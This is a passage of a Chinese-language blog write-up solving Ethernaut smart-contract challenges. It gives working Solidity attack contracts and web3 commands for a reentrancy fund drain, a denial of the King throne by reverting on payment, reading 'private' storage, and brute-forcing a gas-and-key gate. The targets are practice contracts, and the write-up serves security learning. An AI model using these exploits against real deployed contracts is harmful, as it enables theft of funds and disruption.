<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line">    address king;</span><br><span class="line">    uint256 public prize;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _king() public view returns (address) &#123;</span><br><span class="line">        return king;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>砸币是砸不过机器人的，关注<code>receive()</code>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">        payable(king).transfer(msg.value);</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>对手试图夺回王位，<code>transfer()</code>给目标合约这个过程是可控的，我们可以这个过程中把交易<code>revert()</code>掉；</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p><strong>查看当前<code>prize</code></strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x1</span>);</span><br><span class="line"><span class="comment">// &#x27;275676239076594894563100840737553034228913209542&#x27;</span></span><br><span class="line">web3.<span class="property">utils</span>.<span class="title function_">hexToNumberString</span>(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000038d7ea4c68000&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;1000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract KingAttack &#123;</span><br><span class="line">    address public target;</span><br><span class="line"></span><br><span class="line">    constructor(address targ) public payable &#123;</span><br><span class="line">        target = targ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() payable public &#123;</span><br><span class="line">    	// 如此 transfer ，自定义 gas ， transfer 默认的 gas 不足以执行 instant 的 receive()</span><br><span class="line">    	payable(target).call&#123;value:address(this).balance,gas:1000000&#125;(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建时给 2000000000000000 wei ；</p>
<p>尝试 submit ，成功；</p>
<h3 id="长进-1"><a href="#长进-1" class="headerlink" title="长进"></a>长进</h3><p>向一般题目合约转账时，可以自定义<code>gas</code>为<code>1000000</code>或者默认发送所有<code>gas</code>；</p>
<h2 id="ethernaut-Re-entrancy"><a href="#ethernaut-Re-entrancy" class="headerlink" title="ethernaut - Re-entrancy"></a>ethernaut - Re-entrancy</h2><p>大名鼎鼎的重入漏洞；</p>
<p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// The goal of this level is for you to steal all the funds from the contract.</span><br><span class="line"></span><br><span class="line">  // Things that might help:</span><br><span class="line"></span><br><span class="line">// Untrusted contracts can execute code where you least expect it.</span><br><span class="line">// Fallback methods</span><br><span class="line">// Throw/revert bubbling</span><br><span class="line">// Sometimes the best way to attack a contract is with another contract.</span><br><span class="line">// See the &quot;?&quot; page above, section &quot;Beyond the console&quot;</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function donate(address _to) public payable &#123;</span><br><span class="line">        balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _who) public view returns (uint256 balance) &#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) public &#123;</span><br><span class="line">        if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">            (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                _amount;</span><br><span class="line">            &#125;</span><br><span class="line">            balances[msg.sender] -= _amount;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>观察<code>withdraw</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) public &#123;</span><br><span class="line">       if (balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">           (bool result,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">           if (result) &#123;</span><br><span class="line">               _amount;</span><br><span class="line">           &#125;</span><br><span class="line">           balances[msg.sender] -= _amount;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>发现<code>balances</code>的更新发生在转账之后，故而如果我在接受合约的<code>receive()</code>中再调一次<code>withdraw()</code>，此时<code>balances</code>还没有更新，也就是可以成功再次触发转账，嵌套直到余额不足使<code>call()</code>失败为止；</p>
<p>更重要的一点，<code>call()</code>不会回退，而且默认发送所有<code>gas</code>；</p>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><strong>attack contract</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Reentrance &#123;</span><br><span class="line">    function donate(address _to) external  payable ;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) external payable ;</span><br><span class="line"></span><br><span class="line">    receive() external payable ;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReentranceAttack &#123;</span><br><span class="line">    address payable public victim;</span><br><span class="line">    Reentrance public c;</span><br><span class="line"></span><br><span class="line">    constructor (address payable  _victim) public payable &#123;</span><br><span class="line">        victim = _victim;</span><br><span class="line">        c = Reentrance(victim);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() public &#123;</span><br><span class="line">        c.donate&#123;value:1000000000000000&#125;(address(this));</span><br><span class="line">        c.withdraw(1000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destroy() external payable &#123;</span><br><span class="line">        selfdestruct(0xde6e75832f874f0803c1685807eF1d1CD8ed8796);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        c.withdraw(1000000000000000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以<code>destroy()</code>把自己的测试币拿回来；</p>
<h2 id="ethernaut-Elevator"><a href="#ethernaut-Elevator" class="headerlink" title="ethernaut - Elevator"></a>ethernaut - Elevator</h2><p>想起了 Rap God 里面为数不多能记住的几句歌词；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// Cause I know the way to get &#x27;em motivated</span><br><span class="line">// I make elevating music, you make elevator music</span><br><span class="line">// 这网易云翻译的什么积罢呢我请问了</span><br></pre></td></tr></table></figure>

<p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// This elevator won&#x27;t let you reach the top of your building. Right?</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line">// Sometimes solidity is not good at keeping promises.</span><br><span class="line">// This Elevator expects to be used from a Building.</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">    bool public top;</span><br><span class="line">    uint256 public floor;</span><br><span class="line"></span><br><span class="line">    function goTo(uint256 _floor) public &#123;</span><br><span class="line">        Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class="line">            floor = _floor;</span><br><span class="line">            top = building.isLastFloor(floor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次<code>isLastFloor()</code>的结果为<code>false</code>，第二次为<code>true</code>即可；</p>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">    function isLastFloor(uint256) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ElevatorAttack is Building&#123;</span><br><span class="line">    bool public top;</span><br><span class="line"></span><br><span class="line">    constructor(bool _top) &#123;</span><br><span class="line">        top = _top; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint256) external returns (bool)&#123;</span><br><span class="line">        top = !top;</span><br><span class="line">        return top;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开始传入<code>top</code>为<code>true</code>，第一次调用<code>isLastFloor()</code>返回<code>false</code>，第二次返回<code>true</code>，达到目的效果；</p>
<h2 id="ethernaut-Privacy"><a href="#ethernaut-Privacy" class="headerlink" title="ethernaut - Privacy"></a>ethernaut - Privacy</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// The creator of this contract was careful enough to protect the sensitive areas of its storage.</span><br><span class="line"></span><br><span class="line">// Unlock this contract to beat the level.</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line"></span><br><span class="line">// Understanding how storage works</span><br><span class="line">// Understanding how parameter parsing works</span><br><span class="line">// Understanding how casting works</span><br><span class="line">// Tips:</span><br><span class="line"></span><br><span class="line">// Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</span><br></pre></td></tr></table></figure>

<p>题目描述很可怕；</p>
<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line">    bool public locked = true;</span><br><span class="line">    uint256 public ID = block.timestamp;</span><br><span class="line">    uint8 private flattening = 10;</span><br><span class="line">    uint8 private denomination = 255;</span><br><span class="line">    uint16 private awkwardness = uint16(block.timestamp);</span><br><span class="line">    bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">        data = _data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unlock(bytes16 _key) public &#123;</span><br><span class="line">        require(_key == bytes16(data[2]));</span><br><span class="line">        locked = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">    */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>data</code>可读，计算一下位置：</p>
<ul>
<li><p><code>bool locked</code>占第<code>0</code>个 slot；</p>
</li>
<li><p><code>uint256 ID</code>占第<code>1</code>个 slot ；</p>
</li>
<li><p><code>uint8 private flattening</code>，<code>uint8 private denomination</code>，<code>uint16 private awkwardness</code>占第<code>2</code>个 slot ；</p>
</li>
<li><p><code>bytes32[3] private data</code>占第<code>3,4,5</code>个 slot ；</p>
</li>
</ul>
<p><code>data[2]</code>在第<code>5</code>个 slot ；</p>
<h3 id="bytesn-，-uintn-，-intn-的显式转换"><a href="#bytesn-，-uintn-，-intn-的显式转换" class="headerlink" title="bytesn ， uintn ， intn 的显式转换"></a>bytesn ， uintn ， intn 的显式转换</h3><p>这三类数据类型的共同点，都具有多种不同的长度；</p>
<p>由短向长转换时，可以进行隐式转换，对于<code>uintn</code>和<code>intn</code>，高位会被填充使值不变；而对于<code>bytesn</code>，数组会向后延长，用一系列<code>0x00</code>填充多出来的<code>byte</code>；</p>
<p>由长向短转换时则不同，由于数据可能发生损失，系统不提供隐式转换，显式转换则会发生<strong>截断</strong>；</p>
<p>对于<code>uintn</code>和<code>intn</code>，会舍去高位保留低位（ <em>注意这里<code>intn</code>以<strong>补码</strong>存储</em> ）；而对于<code>bytesn</code>，数组会舍弃后面的<code>byte</code>单元；</p>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>回到题目，首先读取<code>data[2]</code>；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance,<span class="number">0x5</span>);</span><br><span class="line"><span class="comment">// &#x27;0x210bc33b722eb5853a8ba02dff9e264130c1a32ac266801344842632710f5b3c&#x27;</span></span><br></pre></td></tr></table></figure>

<p>为了转为<code>bytes16</code>，要取前一半，前 34 位（因为开头的<code>&#39;0x&#39;</code>），传给 <code>unlock()</code>；</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x210bc33b722eb5853a8ba02dff9e264130c1a32ac266801344842632710f5b3c&#x27;</span>.<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">34</span>));</span><br></pre></td></tr></table></figure>

<p>过了，好用，但我还是觉得动态类型语言傻逼，以上；</p>
<h2 id="ethernaut-Gatekeeper-One"><a href="#ethernaut-Gatekeeper-One" class="headerlink" title="ethernaut - Gatekeeper One"></a>ethernaut - Gatekeeper One</h2><p><strong>description</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Make it past the gatekeeper and register as an entrant to pass this level.</span><br><span class="line"></span><br><span class="line">// Things that might help:</span><br><span class="line">// Remember what you&#x27;ve learned from the Telephone and Token levels.</span><br><span class="line">// You can learn more about the special function gasleft(), in Solidity&#x27;s documentation (see Units and Global Variables and External Function Calls).</span><br></pre></td></tr></table></figure>

<p><strong>source</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        require(gasleft() % 8191 == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>gateOne()</code>之前做过了，重点看<code>gateTwo()</code>和<code>gateThree()</code>；</p>
<p><code>gateTwo()</code>涉及<code>gasleft()</code>，在 Remix 中写一个测试函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function testRequire() public &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增了又删得知这个<code>require()</code>消耗<code>33gas</code>，调用时指定 gas 为一个<code>8191</code>的倍数加<code>33</code>即可；</p>
<p><code>gateThree()</code>是截断问题，首先明确，不同位数<code>uint</code>做比较 ， solidity 会将位数低的隐式转换为位数高的；</p>
<p><code>gateThree()</code>的三个愿望：</p>
<ol>
<li>part1 ： <code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)</code></li>
<li>part2 ： <code>uint32(uint64(_gateKey)) != uint64(_gateKey)</code></li>
<li>part3 ： <code>uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)</code></li>
</ol>
<p><em><strong>哦我操地址是 <code>20</code> 字节我一直记错成 <code>16</code> 字节；</strong></em></p>
<p>无伤大雅，看<code>part3</code>，要求<code>gatekey</code>的后 16 位是 <code>tx.origin</code>（钱包地址）的后 16 位（ 2 字节）， 因为<code>uint16</code>补全要与<code>uint32</code>相等，故 16-31 位是 0 （ 2 字节<code>0x00</code>）；</p>
<p>再看<code>part2</code>，截断再补全与原来不等，实际上要求前 32 位（ 4 字节）不全为<code>0x00</code>；</p>
<p>最后<code>part1</code>实际上已经被<code>part3</code>包含了，不再赘述；</p>
<h3 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h3><p>这里很多运算可以拿到合约里去做，但不这样做可以省一点<code>gas fee</code>，优雅是有代价的孩子；</p>
<p>展示省<code>gas</code>做法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player.<span class="title function_">slice</span>(-<span class="number">4</span>);</span><br><span class="line"><span class="comment">// &#x27;8796&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>_gatekey</code>可以为<code>0x1000000000008796</code>；</p>
<p><strong>attack contract</strong></p>
<p>8888 替换成钱包的后四位；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    address public victim;</span><br><span class="line">    event log(bytes);</span><br><span class="line">    event log(bool);</span><br><span class="line">    event log(uint);</span><br><span class="line"></span><br><span class="line">    constructor (address _victim) &#123;</span><br><span class="line">        victim = _victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exp() public&#123;</span><br><span class="line">        bool result;</span><br><span class="line">        bytes memory data;</span><br><span class="line">        for(uint i=0;i &lt; 300;i++)&#123;</span><br><span class="line">            (result,data)= victim.call&#123;gas:8191*3+i&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,bytes8(uint64(0x1000000000008888))));</span><br><span class="line">            if(result)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        emit log(result);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="长进-2"><a href="#长进-2" class="headerlink" title="长进"></a>长进</h3><h4 id="call-传参类型问题"><a href="#call-传参类型问题" class="headerlink" title="call 传参类型问题"></a>call 传参类型问题</h4><p>坑了五个小时，从四点到九点；</p>
<p>这个调用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;enter(bytes8)&quot;,bytes8(uint64(0x1000000000008888)));</span><br></pre></td></tr></table></figure>

<p>一开始是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;enter(bytes8)&quot;,0x1000000000008888);</span><br></pre></td></tr></table></figure>

<p>这个“隐式转换”不会报错（因为 solidity 不会也无法帮助你给<code>call()</code>的参数下判断），但是实际上这个函数调用是注定失败的，因为<code>uint64</code>无法隐式转换为<code>bytes8</code>，以上；</p>
<p>然后在这道题中，你大部分情况下会认为是<code>part2</code>导致的<code>revert()</code>，反复尝试爆破，很难想到这个问题，实际上还是对自己的代码不自信，这也是我反复了五个小时的原因；</p>
